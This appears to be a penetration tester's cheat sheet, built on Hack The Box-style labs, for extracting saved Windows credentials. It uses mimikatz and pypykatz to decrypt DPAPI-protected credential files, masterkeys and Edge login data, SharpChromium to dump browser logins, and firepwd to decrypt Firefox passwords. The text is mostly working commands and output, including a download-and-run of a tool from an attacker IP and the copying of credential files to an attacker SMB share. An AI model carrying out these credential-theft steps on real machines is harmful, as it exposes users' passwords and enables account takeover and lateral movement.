## # `DPAPI` -

In certain scenarios like RDP jumpstations a user might find it useful to save RDP credentials locally in Windows to prevent having to retype passwords. A common scenario is a regular user with a separate admin privileged account that is used for RDP-ing into other boxes. The passwords are then stored in the Windows credential manager.

> The .NET Framework provides access to the data protection API (DPAPI), which allows you to encrypt data using information from the current user account or computer. When you use the DPAPI, you alleviate the difficult problem of explicitly generating and storing a cryptographic key

Credentials for the manager are usually stored in files in either of the following two directories. Use `dir /a` to check their contents.The **credentials files protected by the master password** could be located in:

- <mark style="background: #3D7EFFA6;">C:\Users\username\AppData\Roaming\Microsoft\Credentials</mark>

- <mark style="background: #FFB86CA6;">C:\Users\username\AppData\Local\Microsoft\Credentials</mark>

The files are usually stored as 32 character all caps alphanumerical strings, so something like : 0DCF46D87F2DCE439DC47AA5F9267462

```powershell
Get-ChildItem
C:\Users\napster\AppData\Local\Microsoft\Credentials\ -Force
[*] Tasked beacon to run: Get-ChildItem
C:\Users\naspter\AppData\Local\Microsoft\Credentials\ -Force (unmanaged)
[+] host called home, sent: 133705 bytes
[+] received output:
Directory: C:\Users\napster\AppData\Local\Microsoft\Credentials
Mode LastWriteTime Length Name
---- ------------- ------ ----
-a-hs- 21/10/2018 15:02 436
936A68B5AC87C545C4A22D1AF264C8E9
```

Once you have the file name and path for the credential file, open up mimikatz and do -

```powershell
mimikatz dpapi::cred /in:C:\Users\napster\AppData\Local\Microsoft\Credentials\936A68B5AC87C545C4A22D1AF264C8E9
```

This will respond with :

```powershell
**BLOB**
dwVersion : 00000001 - 1
guidProvider : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
dwMasterKeyVersion : 00000001 - 1
guidMasterKey : {7dc6a492-36e2-4c2d-be66-ba29d263dda2}
dwFlags : 20000000 - 536870912 (system ; )
dwDescriptionLen : 00000030 - 48
szDescription : Local Credential Data
algCrypt : 00006603 - 26115 (CALG_3DES)
dwAlgCryptLen : 000000c0 - 192
dwSaltLen : 00000010 - 16
pbSalt : 03a0fca29ef842f222709ac718f3e095
dwHmacKeyLen : 00000000 - 0
pbHmackKey :
algHash : 00008004 - 32772 (CALG_SHA1)
dwAlgHashLen : 000000a0 - 160
dwHmac2KeyLen : 00000010 - 16
pbHmack2Key : 950f73797104e8b1ca2a05c60cc25baa
dwDataLen : 000000f0 - 240
pbData :
7ff8d2b58c7650dfd160866b282d4df190d1304c02c80cb00c285772969b757361191279d1a02228
d7a174e45f0fd942118a7a6fde4e050c7840d92b12412ade0214bccacbf3244bc60c1f14c3788385
864964077c7de7af0fdf48d86c17c9c816c25b4f7640767800dffb065b94c8a7e5c266ec6b440d8c
955698216cf703b76b2eea4d635e626611bd0a6e4e1ac43156cdbed5cf5ad825674517a8ee2a6984
ba76a29c1dbc5b455c279e0943c66e11e2235b0ec8e5691b38a2ed3f338fc820a58f0cada97e6abf
7b42dfd1d66b5269df7df8e52469913c733de9bde8a897d891ce76d08f3eaa81ad17c50822234fc2
dwSignLen : 00000014 - 20
pbSign : 95878397a80705153796372206f26b6b4e877e62
```

The noteworthy fields here are `pbData` and `guidMasterKey` - a simplistic way to look at it, is that ==pbData is the data we want to decrypt== and ==guidMasterKey is the key needed to do so==.

This `guidMasterKey` can also be obtained via an `LSASS Cache` , as well as the required `MasterKey` :

```powershell
mimikatz !sekurlsa::dpapi
```

You should get a 129 character string as masterkey associated with the GUID you found in the previous step.

```powershell
[00000003]
* GUID : {7dc6a492-36e2-4c2d-be66-ba29d263dda2}
* Time : 17/06/2020 08:14:53
* MasterKey :
dcd70638e50e3bcec7cd7fb888399748fea41f9bb137a72a13c98e30ee64469e27a03083256e51f04051a427da9b8c34520fad6c8a486c3f6043ea959026670c
* sha1(key) : 501b8718e58df3aaca9db02591ead5a29d4d6a42
```

Proceed by using the masterkey to decrypt the credentials -

```powershell
mimikatz dpapi::cred /in:C:\Users\napster\AppData\Local\Microsoft\Credentials\936A68B5AC87C545C4A22D1AF264C8E9 /masterkey:dcd70638e50e3bcec7cd7fb888399748fea41f9bb137a72a13c98e30ee64469e27a03083256e51f04051a427da9b8c34520fad6c8a486c3f6043ea959026670c
```

The username and plaintext password should be printed -

```powershell
UserName       : LAN\username_adm
CredentialBlob : Sup3rAw3s0m3Passw0rd!
```

Use `vault::list` to figure out what boxes the credentials belong to. Often they are to specific servers.

### ## <mark style="background: #3D7EFFA6;">Master Keys</mark> - 

The DPAPI keys used for encrypting the user's RSA keys are stored under `C:\Users\[USER]\AppData\Roaming\Microsoft\Protect\{SID}\` directory, where {SID} is the [**Security Identifier**](https://en.wikipedia.org/wiki/Security_Identifier) **of that user**. **The DPAPI key is stored in the same file as the master key that protects the users private keys**. It usually is 64 bytes of random data. (Notice that this directory is protected so you cannot list it using `dir` from the cmd, but you can list it from PS).

```powershell
PS C:\Users\Bob.Wood> gci -force AppData\Roaming\Microsoft\Protect\

    Directory: C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         8/22/2022   2:17 PM                S-1-5-21-1844305427-4058123335-2739572863-2761
-a-hs-          5/4/2022   4:49 PM             24 CREDHIST
-a-hs-         8/24/2022   1:41 PM             76 SYNCHIST
```

```powershell
PS C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect\S-1-5-21-1844305427-4058123335-2739572863-2761> ls -force

    Directory: C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect\S-1-5-21-1844305427-4058123335-2739572863-2761

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         8/22/2022   2:17 PM            740 3ebf1d50-8f5c-4a75-9203-20347331bad8
-a-hs-          5/4/2022   4:49 PM            740 a8bd1009-f2ac-43ca-9266-8e029f503e11
-a-hs-          5/4/2022   4:49 PM            908 BK-WINDCORP
-a-hs-         8/22/2022   2:17 PM             24 Preferred
```

If `C:\users\bob.wood\AppData\Roaming\Microsoft\Credentials` is empty, that means there are no system level keys stored here. Another thing DPAPI is used for is storing browser saved creds.Edge directory:

```powershell
PS C:\users\bob.wood\AppData\local\Microsoft\Edge\User Data\Default> ls "Login Data"

    Directory: C:\users\bob.wood\AppData\local\Microsoft\Edge\User Data\Default

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/4/2022   7:46 PM          55296 Login Data
```

You need the above file from the Edge directory,  `Login Data`.

Copy it to your Kali machine using certutil -

```powershell
PS C:\users\bob.wood\AppData\local\Microsoft\Edge\User Data\Default> certutil -encode "Login Data" \programdata\logindata
Input Length = 55296
Output Length = 76088
CertUtil: -encode command completed successfully. 
PS C:\users\bob.wood\AppData\local\Microsoft\Edge\User Data\Default> type \programdata\logindata
-----BEGIN CERTIFICATE-----
U1FMaXRlIGZvcm1hdCAzAAgAAQEAQCAgAAAAAgAAABsAAAAAAAAAAAAAABAAAAAE
AAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC
AC5bMAUAAAABB/sAAAAAEAf7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
...[snip]...
```

On Kali -

```bash
root@kali$ file logindata 
logindata: SQLite 3.x database, last written using SQLite version 3038000, page size 2048, file counter 2, database pages 27, cookie 0x10, schema 4, UTF-8, version-valid-for 2
```

```bash
root@kali$ sqlite3 logindata
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
breached                logins_edge_extended    sync_entities_metadata
field_info              meta                    sync_model_metadata   
insecure_credentials    password_notes        
logins                  stats 
```

The `logins` table is where passwords are saved:

```bash
sqlite> .headers on
sqlite> select origin_url,username_value,password_value from logins;
origin_url|username_value|password_value
http://somewhere.com/login.html|bob.wood@windcorp.htb|v109?]2y1eOONtx#5mmЂmX=t
http://google.com/login.html|bob.wood@windcorp.htb|v10]HN/g%{g?h5PK Ff&ܷxu
http://webmail.windcorp.com/login.html|bob.woodADM@windcorp.com|v10iu25ƴ-'>lt<R>ȄakkmH
```

The passwords are encrypted. The key to decrypt them is saved in `Local State`:

```bash
root@kali$ cat localstate | jq -r .os_crypt.encrypted_key 
RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAAAJEL2orPLKQ5JmjgKfUD4REAAAAAoAAABFAGQAZwBlAAAAA2YAAMAAAAAQAAAAERo760RqlJ/1NQi4Mzu/ZgAAAAAEgAAAoAAAABAAAAAWAlikfH8o+jE6a5gX3L2aKAAAACAUAaTmAnujTfLRzhFqjgv7O9AUtBxQzQK2W+gZfUU0M8NHuoRD4a4UAAAAjFmocvQLwq3PeEzWRbAz1o7pQWM=
```

### Using [pypykatz](https://github.com/skelsec/pypykatz) to determine the GUID :

```bash
root@kali$ cat localstate | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- > blob
root@kali$ pypykatz dpapi describe blob blob 
== DPAPI_BLOB ==
version: 1 
credential_guid: b'\xd0\x8c\x9d\xdf\x01\x15\xd1\x11\x8cz\x00\xc0O\xc2\x97\xeb' 
masterkey_version: 1 
masterkey_guid: a8bd1009-f2ac-43ca-9266-8e029f503e11 
...[snip]...
```

To decrypt these logins, I’ll need to run four steps:

1.  Use the SID and password for the user to generate “prekeys”.
2.  Use the prekeys to decrypt the master password.
3.  Use the master password to decrypt the Edge password from `Local State`.
4.  Use the Edge password to decrypt the login data.

- Run with the `prekey` subcommand in `pypykatz`:

```bash
root@kali$ pypykatz dpapi prekey password 'S-1-5-21-1844305427-4058123335-2739572863-2761' '!@p%i&J#iNNo1T2' | tee pkf
4ea57b2e9e19cb91226b1ce0f64e4edad3d56c82
0fcd9d392606c1dbf84c875dcfad678ca56cb607
202e6812a189277e0ccd0bc72dcfdd4ed6e9469e
```

It generates three prekeys, which I save to a file `pkf` using `tee`.

- Give the file with the prekeys to `masterkey` along with the GUID file from `Protect` to generate a file containing the master key:

```bash
root@kali$ pypykatz dpapi masterkey a8bd1009-f2ac-43ca-9266-8e029f503e11 pkf -o mkf
root@kali$ cat mkf
{
    "backupkeys": {},
    "masterkeys": {
        "a8bd1009-f2ac-43ca-9266-8e029f503e11": "930b9acfcf2f581cdb9929c1ed7e9ace387ce63f95e4f9e0c5b48e43d5c36bc8f2d84056195d9b02b681c98beafb090a2cdc51e799a22f863d3ad227746e0066"
    }
}
```

The result is a JSON file with a master key in it.

- Step 3 and step 4 are carried out with the `chrome` subcommand, giving it the location of the `Local State` and `Login Data` files, as well as the file with the master key:

```bash
root@kali$ pypykatz dpapi chrome --logindata logindata mkf localstate
file: logindata user: bob.wood@windcorp.htb pass: b'SemTro\xc2\xa432756Gff' url: http://somewhere.com/action_page.php
file: logindata user: bob.wood@windcorp.htb pass: b'SomeSecurePasswordIGuess!09' url: http://google.com/action_page.php
file: logindata user: bob.woodADM@windcorp.com pass: b'smeT-Worg-wer-m024' url: http://webmail.windcorp.com/action_page.php
```

It uses the master key to decrypt the Edge specific key in `Local State`, and that key to decrypt the three passwords in `Login Data`.

### Using SharpChromium :

[SharpChromium](https://github.com/djhohnstein/SharpChromium) is a .NET exe that will extract cookies and login data from Chrome.Download a compiled version from [SharpCollection](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpChromium.exe) and upload it to the machine, and it runs:

```powershell
*Evil-WinRM* PS C:\windows\debug\wia> iwr http://10.10.14.6/SharpChromium.exe -outfile scium.exe
*Evil-WinRM* PS C:\windows\debug\wia> .\scium.exe

Usage:
    .\SharpChromium.exe arg0 [arg1 arg2 ...]

Arguments:
    all       - Retrieve all Chromium Cookies, History and Logins.
    full      - The same as 'all'
    logins    - Retrieve all saved credentials that have non-empty passwords.
    history   - Retrieve user's history with a count of each time the URL was
                visited, along with cookies matching those items.
    cookies [domain1.com domain2.com] - Retrieve the user's cookies in JSON format.
                                        If domains are passed, then return only
                                        cookies matching those domains. Otherwise,
                                        all cookies are saved into a temp file of
                                        the format "%TEMP%\$browser-cookies.json"
```

Giving it the `logins` command will dump the same data as we did earlier :

```powershell
*Evil-WinRM* PS C:\windows\debug\wia> .\scium.exe logins
[*] Beginning Edge extraction.

--- Chromium Credential (User: Bob.Wood) ---
URL      : http://somewhere.com/action_page.php
Username : bob.wood@windcorp.htb
Password : SemTro32756Gff

--- Chromium Credential (User: Bob.Wood) ---
URL      : http://google.com/action_page.php
Username : bob.wood@windcorp.htb
Password : SomeSecurePasswordIGuess!09

--- Chromium Credential (User: Bob.Wood) ---
URL      : http://webmail.windcorp.com/action_page.php
Username : bob.woodADM@windcorp.com
Password : smeT-Worg-wer-m024

[*] Finished Edge extraction.

[*] Done.
```

### Using SharpDPAPI :

```bash
SharpDPAPI.exe machinetriage
```

## # `Extract Firefox Passwords` -

 [Firepwd](https://github.com/lclevy/firepwd)

You will need two files from the profile, `key4.db` and `logins.json`.Copy them to your local machine :

```powershell
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> net use \\10.10.14.6\share /u:nap nap
The command completed successfully.

*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> copy key4.db \\10.10.14.6\share\
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> copy logins.json \\10.10.14.6\share\
```

With those two files, [Firepwd](https://github.com/lclevy/firepwd) will decrypt any stored passwords :

```bash
oxdf@hacky$ python /opt/firepwd/firepwd.py 
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
       }
     }
   }
   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
 }
clearText b'70617373776f72642d636865636b0202'
<SNIP>
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

